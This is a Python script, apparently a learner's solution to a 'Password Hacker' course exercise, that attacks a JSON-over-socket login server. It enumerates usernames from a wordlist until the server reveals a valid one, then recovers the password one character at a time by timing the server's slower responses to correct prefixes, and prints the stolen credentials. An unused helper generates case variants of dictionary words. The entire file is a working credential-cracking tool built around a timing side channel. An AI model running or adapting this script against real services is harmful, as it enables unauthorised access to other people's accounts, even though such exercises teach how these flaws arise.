import itertools
import socket
import sys
import json
from string import ascii_letters, digits
from time import time


# Function used in first stage to generate all possible combinations of letters and digits of words in a file provided
# Redundant function now
def brute_force(p):
    with open(p) as file:
        for i in file:
            combinations = list(map(''.join, itertools.product(*zip(i.strip().upper(), i.strip().lower()))))
            for j in combinations:
                yield j


path = r"C:\Users\herza\PycharmProjects\Password Hacker with Python\Password Hacker with Python\task\logins.txt"
# Create variables from the input arguments
args = sys.argv
ip_address = args[1]
port = int(args[2])
address = (ip_address, port)

login_info = {"login": " ", "password": " "}
password = []
symbols = ascii_letters + digits

# Create socket
with socket.socket() as client_socket:
    client_socket.connect(address)
    # Getting the Login info. Once done move to Password
    with open(path) as file:
        for i in file:
            login_info["login"] = i.strip()
            msg = json.dumps(login_info)
            client_socket.send(msg.encode())
            response = json.loads(client_socket.recv(10240).decode())
            if response["result"] == "Wrong password!":
                break

    # Getting the password
    while True:
        for i in symbols:
            password.append(i)
            login_info["password"] = "".join(password)
            msg = json.dumps(login_info)
            client_socket.send(msg.encode())
            # Checking the time to receive the message from the server
            start = time()
            response = json.loads(client_socket.recv(10240).decode())
            end = time()

            if response["result"].lower() == 'connection success!':
                print(json.dumps(login_info))
                exit(1)
            # Exception produces time of operation longer than 0.1s (found by trial and error)
            elif (end - start) > 0.1:
                break
            # Wrong password will
            else:
                password.pop()
